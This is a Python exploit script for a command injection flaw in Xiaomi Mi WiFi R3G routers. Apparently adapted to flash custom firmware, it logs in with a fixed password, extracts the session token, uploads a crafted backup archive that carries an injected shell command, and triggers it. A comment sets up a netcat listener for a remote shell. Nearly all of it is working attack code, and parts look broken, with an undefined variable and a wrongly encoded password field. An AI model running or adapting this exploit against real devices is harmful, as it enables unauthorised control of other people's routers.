#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

# HOW TO RUN
# Install requirements
# pip3 install -r requirements.txt
# Run the script
# python3 remote_command_execution_vulnerability.py

import os
import sys
import shutil
import tarfile
import requests
import datetime
import math
import random
import hashlib

router_ip_address = "192.168.31.1"
# Use default IP address for update firmware automatically 
# router_ip_address = input("Router IP address [press enter for using the default {}]: ".format(router_ip_address)) or router_ip_address

# get stok
# stok = input("stok: ")
# stok = "eeb59f33a51cd46649cd4ad1e3f50ecf"

# Extract stok from Xiaomi login API for update firmware automatically
def timestamp(): # A method(function) for getting timestamp easier
    return datetime.datetime.now().timestamp()

def create_nonce(): # A method(function) for create "nonce" value which is required at Xiaomi login API
    type = 0
    # deviceId = '00:e0:4c:37:d4:ad'
    deviceId = '64:64:4a:93:76:55'
    """ 
        timestamp in Python is different with timestamp in JavaScript.
        So if you want to send same value with JS, you need to multiply 1,000 to that value. 
        But in this case, the original JS source code has "Math.floor(new Date().getTime() / 1000);" to get timestamp, so,
        to get a timestamp like JS, remove " / 1000" part for same effect as "/ 1000 * 1000"
    """
    time = math.floor(timestamp())  
    rnd = math.floor(random.random() * 10000)
    return '_'.join([str(type), deviceId, str(time), str(rnd)])

key = "a2ffa5c9be07488bbb04a3a47d3c5f6a" # key value for encrypt
iv = "4175472480004614961023454661220" # iv value for decrypt

nonce = create_nonce()
oldPwd = hashlib.sha1()
"""
    "xiaomi123" is a fixed test password
    Strings in Python needs to be encoded before hashing. Otherwise, it will throw an error like "TypeError: Unicode-objects must be..."
    The original JS code looks like this.
    >   oldPwd.update(''.join([nonce, str(oldPwd.update(''.join(["xiaomi123", key]).encode('utf-8')))]).encode('utf-8'))
    But, this is hard to understand, therefore this line splitted in two lines.
"""
s1 = ''.join(["xiaomi123", key]).encode('utf-8')
s2 = ''.join([str(nonce), str(s1)]).encode('utf-8')
oldPwd.update(s2)

print("".join(["Nonce : ", str(nonce), " oldPwd : ", oldPwd.hexdigest()])) # debuging print

login_data = { # This data will be sent through POST API call
    'username': 'admin',
    'password': oldPwd,
    'logtype': 2,
    'nonce': nonce
}

# Request to login API
r = requests.post("http://192.168.31.1/cgi-bin/luci/api/xqsystem/login", data = login_data)
print("---------content-------------")
print(r.content)
print("---------url-------------")
print(r.url)
print("---------json-------------")
print(r.json())
# redirected_url = r.url

print("Extracting stok from " + redirected_url + "...")

"""
    manipulating url with format like ["192.168.31.1/cgi-bin/luci;stok=6fb7072bcf878af70affb49b8f8c2fea/web/home#router"]
    1. split url with ";" to split IP address and parameter 
    >   ["192.168.31.1/cgi-bin/luci", "stok=6fb7072bcf878af70affb49b8f8c2fea/web/home#router"]
    2. split parameter with "/" to get stok 
    >   ["stok=6fb7072bcf878af70affb49b8f8c2fea", "web", "home#router"] 
    3. split stok with "=" to get pure stok 
    >   ["stok", "6fb7072bcf878af70affb49b8f8c2fea"]
    4. Store splited stok
"""
stok = redirected_url.split(";", -1)
stok = stok[1].split("/", -1)
stok = stok[0].split("=", -1)
stok = stok[1]

# From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
command = "((sh /tmp/script.sh exploit) &)"

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

if os.path.exists("build"):
    shutil.rmtree("build")
os.makedirs("build")

# make config file
speed_test_filename = "speedtest_urls.xml"
with open("speedtest_urls_template.xml", "rt", encoding = "UTF-8") as f:
    template = f.read()
data = template.format(router_ip_address=router_ip_address, command=command)
# print(data)
with open("build/speedtest_urls.xml", "wt", encoding = "UTF-8") as f:
    f.write(data)

print("****************")
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("****************")

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    tar.add("script.sh")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)
# print(r1.text)

# exec download speed test, exec command
print("start exec command...")
r2 = requests.get(
    "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok),
    proxies=proxies
)

# print(r2.text)
# print("done! Now you can connect to the router using several options: (user: root, password: root)")
# print("* telnet {}".format(router_ip_address))
# print("* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{}".format(router_ip_address))
# print("* ftp: using a program like cyberduck")

print("Done! Wait until Danbi firmware successfully installs!")